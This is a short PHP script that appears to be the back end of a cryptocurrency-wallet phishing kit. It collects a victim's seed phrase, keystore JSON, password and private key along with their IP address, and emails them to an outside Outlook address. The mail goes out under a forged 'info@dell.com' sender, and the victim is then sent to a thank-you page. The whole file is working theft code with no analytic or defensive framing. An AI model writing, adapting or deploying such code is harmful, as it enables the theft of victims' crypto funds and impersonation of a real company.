<?php
$ip = getenv("REMOTE_ADDR");
$message .= "\n\n";
$message .= "++++++++++<[ Crypt ]>++++++++++\n";
$message .= "wallet info        : ".$_POST['wallet']."\n";
$message .= "phrase        : ".$_POST['phrase']."\n";
$message .= "Json code        : ".$_POST['json']."\n";
$message .= "Json code        : ".$_POST['pass']."\n";
$message .= "wallet Private Key        : ".$_POST['key']."\n";

$message .= "IP: ".$ip."\n\n";

$recipient = "chris4play01@outlook.com";
$subject = "SVC | $ip";
$headers = "From: Odin <info@dell.com>";
mail($recipient,$subject,$message,$headers);
header("Location: thankyou.html");
?>